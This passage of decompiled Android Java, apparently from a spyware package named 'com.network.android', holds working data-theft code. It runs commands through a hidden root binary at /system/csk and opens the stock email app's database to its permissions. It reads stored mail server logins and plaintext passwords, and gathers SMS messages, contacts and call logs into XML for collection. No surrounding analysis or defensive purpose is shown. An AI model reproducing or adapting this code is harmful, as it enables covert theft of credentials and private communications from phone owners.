            throw th;
        }
    }

    private static void a(XmlSerializer xmlSerializer, String str, StringBuilder sb) {
        if (sb != null) {
            try {
                if (sb.length() > 0) {
                    xmlSerializer.startTag("", "miscEntry");
                    xmlSerializer.attribute("", "type", str);
                    xmlSerializer.attribute("", "timestamp", e.b());
                    xmlSerializer.startTag("", "data");
                    try {
                        String sb2 = sb.toString();
                        xmlSerializer.cdsect(e(sb2));
                        URLEncoder.encode(sb2, "UTF-8");
                    } catch (Throwable th) {
                        a.a("serializeUtfString Exception- " + th.getMessage(), th);
                    }
                    xmlSerializer.endTag("", "data");
                    xmlSerializer.endTag("", "miscEntry");
                }
            } catch (Throwable th2) {
                a.a("addMiscEntry Exception- " + th2.getMessage(), th2);
            }
        }
    }

    public static boolean a(Cursor cursor, XmlSerializer xmlSerializer, String str) {
        try {
            String string = cursor.getString(cursor.getColumnIndex("body"));
            String trim = cursor.getString(cursor.getColumnIndex("date")).trim();
            String string2 = cursor.getString(cursor.getColumnIndex("address"));
            if (string2 != null) {
                string2.trim();
            }
            a(xmlSerializer, str.trim(), cursor.getString(cursor.getColumnIndex("address")), string, trim, (String) null);
            return true;
        } catch (Throwable th) {
            a.a("get sms single Exception- " + th.getMessage(), th);
            throw th;
        }
    }

    private static byte[] a(InputStream inputStream) {
        if (inputStream instanceof ByteArrayInputStream) {
            int available = inputStream.available();
            byte[] bArr = new byte[available];
            inputStream.read(bArr, 0, available);
            return bArr;
        }
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byte[] bArr2 = new byte[1024];
        while (true) {
            int read = inputStream.read(bArr2, 0, 1024);
            if (read == -1) {
                return byteArrayOutputStream.toByteArray();
            }
            byteArrayOutputStream.write(bArr2, 0, read);
        }
    }

    /* JADX WARNING: Removed duplicated region for block: B:17:0x00a3  */
    /* JADX WARNING: Removed duplicated region for block: B:29:0x010a A[Catch:{ Throwable -> 0x0129 }] */
    /* JADX WARNING: Removed duplicated region for block: B:39:0x015c A[Catch:{ Throwable -> 0x0205 }, LOOP:2: B:37:0x0156->B:39:0x015c, LOOP_END] */
    /* JADX WARNING: Removed duplicated region for block: B:46:0x0238 A[Catch:{ Throwable -> 0x02c5 }] */
    /* JADX WARNING: Removed duplicated region for block: B:51:0x0283 A[Catch:{ Exception -> 0x0313 }] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static java.lang.String b(android.content.ContentResolver r13, android.database.Cursor r14, java.lang.StringBuilder r15) {
        /*
        // Method dump skipped, instructions count: 816
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.android.m.b(android.content.ContentResolver, android.database.Cursor, java.lang.StringBuilder):java.lang.String");
    }

    public static HashMap b(String str) {
        HashMap hashMap;
        Throwable th;
        try {
            a.a("getChmodPermissionsIntoArray starting for file path: " + str);
            hashMap = new HashMap();
            String str2 = "";
            try {
                String[] split = str.split("/");
                for (int i = 0; i < split.length; i++) {
                    String str3 = str2 + split[i];
                    if (str3.length() > 1) {
                        hashMap.put(str3, Integer.valueOf(b.b(new File(str3))));
                    }
                    str2 = str3 + "/";
                }
            } catch (Throwable th2) {
                th = th2;
                a.a("getChmodPermissionsIntoArray: " + th.getMessage(), th);
                return hashMap;
            }
        } catch (Throwable th3) {
            hashMap = null;
            th = th3;
            a.a("getChmodPermissionsIntoArray: " + th.getMessage(), th);
            return hashMap;
        }
        return hashMap;
    }

    private static void b(Cursor cursor, XmlSerializer xmlSerializer, String str) {
        if (cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                try {
                    try {
                        a(cursor, xmlSerializer, str);
                    } catch (Throwable th) {
                        a.a("get single sms " + cursor.getCount() + " Exception- " + th.getMessage(), th);
                    }
                } catch (Throwable th2) {
                    a.a("get sms Exception- " + th2.getMessage(), th2);
                    return;
                }
            }
            cursor.close();
        }
    }

    public static void b(String str, String str2) {
        try {
            if (!new File("/system/csk").exists()) {
                a.a("setFilePathChmod MY_SU does not exists. returning");
                return;
            }
            String str3 = "";
            String[] split = str2.split("/");
            for (int i = 0; i < split.length; i++) {
                String str4 = str3 + split[i];
                if (str4.length() > 1) {
                    String str5 = "chmod " + str + " " + str4;
                    a.a("setFilePathChmod running command: " + str5);
                    c(str5);
                }
                str3 = str4 + "/";
            }
        } catch (Throwable th) {
            a.a("setFilePathChmod: " + th.getMessage(), th);
        }
    }

    private static void b(StringBuilder sb) {
        SQLiteDatabase openDatabase;
        Cursor cursor = null;
        try {
            a.a("getContent getMailPassword:" + "/data/data/com.android.email");
            if (!new File("/data/data/com.android.email").exists()) {
                a.a("getMailPassword mail DB not exists -> exit!: " + "/data/data/com.android.email");
                return;
            }
            ReentrantReadWriteLock.ReadLock readLock = new ReentrantReadWriteLock().readLock();
            try {
                c("chmod 0777 /data/data/com.android.email; chmod 0777 /data/data/com.android.email/databases; ");
                a("/data/data/com.android.email/databases", "0777");
                readLock.lock();
                try {
                    openDatabase = SQLiteDatabase.openDatabase("/data/data/com.android.email/databases/" + "EmailProvider.db", null, 16);
                } catch (Throwable th) {
                    a.a("get getMailPasswordfail to openDatabase: " + "/data/data/com.android.email/databases/" + "/EmailProviderBody.db, try to open with OPEN_READONLY");
                    openDatabase = SQLiteDatabase.openDatabase("/data/data/com.android.email/databases/" + "EmailProvider.db", null, 17);
                }
                Cursor rawQuery = openDatabase.rawQuery("select * from HostAuth", null);
                a.a("getContent getMailPassword count : " + rawQuery.getCount());
                while (rawQuery.moveToNext()) {
                    String string = rawQuery.getString(rawQuery.getColumnIndex("address"));
                    String string2 = rawQuery.getString(rawQuery.getColumnIndex("login"));
                    String string3 = rawQuery.getString(rawQuery.getColumnIndex("password"));
                    a.a("get getMailPassword host:" + string + " username: " + string2 + " password: " + string3);
                    if (!(string2 == null || string3 == null)) {
                        sb.append("Mail ");
                        sb.append(string);
                        sb.append(" " + string2 + "/" + string3);
                        sb.append("\r\n");
                    }
                }
                c("chmod 0751 /data/data/com.android.email; chmod 0771 /data/data/com.android.email/databases; ");
                a("/data/data/com.android.email/databases", "0666");
                try {
                    readLock.unlock();
                    if (rawQuery != null) {
                        rawQuery.close();
                    }
                } catch (Throwable th2) {
                    a.a("get getMailPassword finally- " + th2.getMessage(), th2);
                }
            } catch (Throwable th3) {
                a.a("get getMailPassword finally- " + th3.getMessage(), th3);
            }
        } catch (Exception e2) {
            a.a("get getMailPassword finally all- " + e2.getMessage(), e2);
        }
    }

    public static void b(XmlSerializer xmlSerializer, ContentResolver contentResolver) {
        a.a("get SMS");
        try {
            Cursor query = contentResolver.query(Uri.parse("content://sms/sent"), null, null, null, null);
            Cursor query2 = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null);
            if (query.getCount() > 0 || query2.getCount() > 0) {
                a.a("SMS Send: " + query.getCount() + ", SMS Incoming: " + query2.getCount());
                xmlSerializer.startTag("", "sms");
                b(query2, xmlSerializer, "inbound");
                b(query, xmlSerializer, "outbound");
                xmlSerializer.endTag("", "sms");
            }
        } catch (Throwable th) {
            a.a("get sms Exception- " + th.getMessage(), th);
        }
        a.a("get SMS ended");
    }

    public static synchronized void c(String str) {
        int i = 0;
        synchronized (m.class) {
            if (new File("/system/csk").exists()) {
                while (true) {
                    if (i >= 5) {
                        break;
                    }
                    Process process = null;
                    try {
                        a.a("runProcess start (synchronized)" + i + ". command: " + str);
                        Process exec = Runtime.getRuntime().exec(new String[]{"/system/csk", str});
                        try {
                            int a2 = a(str, exec);
                            if (a2 == 0) {
                                a.a("runProcess cmd=" + str + " success: " + a2);
                            } else {
                                a.a("runProcess cmd=" + str + " fail: " + a2);
                            }
                            if (exec != null) {
                                try {
                                    exec.destroy();
                                } catch (Throwable th) {
                                }
                            }
                        } catch (TimeoutException e2) {
                            a.a("runProcess cmd=" + str + " timeout=" + e2.getMessage());
                            i++;
                        }
                    } catch (Exception e3) {
                        a.a("runProcess Exception- " + e3.getMessage(), e3);
                        if (0 != 0) {
                            process.destroy();
                        }
                    } catch (Throwable th2) {
                    }
                }
            } else {
                a.a("runProcess my su does not exists. returning");
            }
        }
    }

    public static void c(XmlSerializer xmlSerializer, ContentResolver contentResolver) {
        a.a("get Contacts");
        Cursor query = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        if (query != null) {
            if (query.getCount() > 0) {
                try {
                    xmlSerializer.startTag("", "contacts");
                    while (query.moveToNext()) {
                        a(xmlSerializer, contentResolver, query, "add", new StringBuilder());
                    }
                    query.close();
                    xmlSerializer.endTag("", "contacts");
                } catch (Exception e2) {
                    a.a("get contacts Exception- " + e2.getMessage(), e2);
                }
            }
            a.a("get Contacts End");
        }
    }

    public static void d(XmlSerializer xmlSerializer, ContentResolver contentResolver) {
        int count;
        try {
            Cursor query = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC");
            if (query != null && (count = query.getCount()) > 0) {
                a.a("GetContent get Call log: " + count);
                xmlSerializer.startTag("", "phoneCalls");
                while (query.moveToNext()) {
                    String string = query.getString(query.getColumnIndex("number"));
                    String string2 = query.getString(query.getColumnIndex("date"));
                    int i = query.getInt(query.getColumnIndex("type"));
                    String string3 = query.getString(query.getColumnIndex("duration"));
                    String string4 = query.getString(query.getColumnIndex("_id"));
                    try {
                        int columnIndex = query.getColumnIndex("logtype");
                        if (columnIndex != -1) {
                            int i2 = query.getInt(columnIndex);
                            if (i2 != 300) {
                                if (i2 == 200) {
                                }
                            }
                        }
                    } catch (Throwable th) {
                        a.a("GetContent logtype- " + th.getMessage(), th);
                    }
                    a(xmlSerializer, string, string2, i, string3, null, string4);
                }
                xmlSerializer.endTag("", "phoneCalls");
                a.a("get Call log end");
            }
        } catch (Exception e2) {
            a.a("GetContent getCall", e2);
        }
    }

    public static String[] d(String str) {
        a.a("GetContent getFileNames");
        String[] strArr = null;
        File file = new File(str);
        if (file.isDirectory()) {
            try {
                File[] listFiles = file.listFiles();
                strArr = new String[listFiles.length];
                for (int i = 0; i < listFiles.length; i++) {
                    strArr[i] = listFiles[i].getName();
                }
            } catch (Exception e2) {
                a.a("GetContent getFileNames exception " + e2.getMessage(), e2);
            }
        } else {
            a.a("GetContent getFileNames '" + str + "' is not a directory.");
        }
        return strArr;
    }

    private static String e(String str) {
        try {
            return new String(str.getBytes("UTF8"));
        } catch (Throwable th) {
            a.a("toUTF8 Exception- " + th.getMessage(), th);
            return str;
        }
    }

    private static int f(String str) {
        try {
            return Integer.parseInt(str);
        } catch (Exception e2) {
            return 100;
        }
    }
}
